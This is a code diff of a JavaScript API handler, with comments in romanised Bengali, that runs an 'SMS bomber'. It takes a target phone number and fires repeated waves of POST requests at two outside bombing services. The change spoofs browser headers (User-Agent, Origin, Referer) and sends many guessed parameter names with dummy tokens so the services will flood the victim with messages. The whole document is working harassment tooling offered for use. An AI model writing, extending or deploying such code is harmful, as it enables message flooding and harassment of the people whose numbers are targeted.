@@ -5,10 +5,9 @@ export default async function handler(req, res) {
 
   const { number, amount, isUltimate } = req.body;
 
-  // Amra ekhane direct URL construction korbo jate query string bypass hoy
-  const targetBaseUrls = [
-    'https://shadowx-sms-bomber.onrender.com/api/send', 
-    'https://nuke-sms-bomber.pages.dev/api/attack'
+  const targetLinks = [
+    'https://shadowx-sms-bomber.onrender.com/',
+    'https://nuke-sms-bomber.pages.dev/'
   ];
 
   const runAttack = async () => {
@@ -16,37 +15,44 @@ export default async function handler(req, res) {
     const delay = isUltimate ? 500 : 2000; 
 
     for (let i = 0; i < totalWaves; i++) {
-      // Amra ekhane ekta "Chaos" method use korbo
-      // Mane ekshathe multiple parameter try korbo
-      const attackPromises = targetBaseUrls.map(async (url) => {
+      const attackPromises = targetLinks.map(async (link) => {
         try {
-          // Amra ekta fake request header set korbo jate eta ekdom real lage
-          const response = await fetch(url, {
+          // Amra ekhane pray sob possible parameter eksathe pathacchi
+          // Jate oi website jekono ekta parameter diye kaj shuru kore
+          const massivePayload = {
+            number: number,
+            phone: number,
+            target: number,
+            mobile: number,
+            phone_number: number,
+            amount: 1,
+            count: 1,
+            qty: 1,
+            country: "BD",
+            country_code: "880",
+            service: "whatsapp",
+            msg: "Ultimate Attack",
+            auth: "true",
+            token: "dummy_token",
+            is_active: true,
+            status: "active"
+          };
+
+          const response = await fetch(link, {
             method: 'POST',
             headers: { 
               'Content-Type': 'application/json',
-              'Accept': 'application/json',
+              'Accept': 'application/json, text/plain, */*',
               'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
-              'Origin': 'https://shadowx-sms-bomber.onrender.com',
-              'Referer': 'https://shadowx-sms-bomber.onrender.com/',
+              'Origin': link,
+              'Referer': link,
+              'X-Requested-With': 'XMLHttpRequest',
             },
-            body: JSON.stringify({
-              // Amra ekhane multiple formats try korchi
-              number: number,
-              phone: number,
-              target: number,
-              mobile: number,
-              amount: 1,
-              count: 1,
-              country: "BD",
-              service: "whatsapp",
-              msg: "Ultimate Attack",
-              auth: "true",
-              token: "123456789"
-            }),
+            body: JSON.stringify(massivePayload),
           });
 
-          console.log(`[Wave ${i}] Target: ${url} | Status: ${response.status}`);
+          console.log(`[Wave ${i}] Target: ${link} | Status: ${response.status}`);
+
         } catch (err) {
           console.error(`[Wave ${i}] Error: ${err.message}`);
         }
@@ -61,6 +67,6 @@ export default async function handler(req, res) {
 
   return res.status(200).json({ 
     success: true, 
-    message: isUltimate ? "ULTIMATE ATTACK STARTED! 🚀" : "ATTACK STARTED! 🔥" 
+    message: isUltimate ? "ULTIMATE ATTACK STARTED! 🚀" : "ATTACK IN PROGRESS! 🔥" 
   });
-}
+                        }
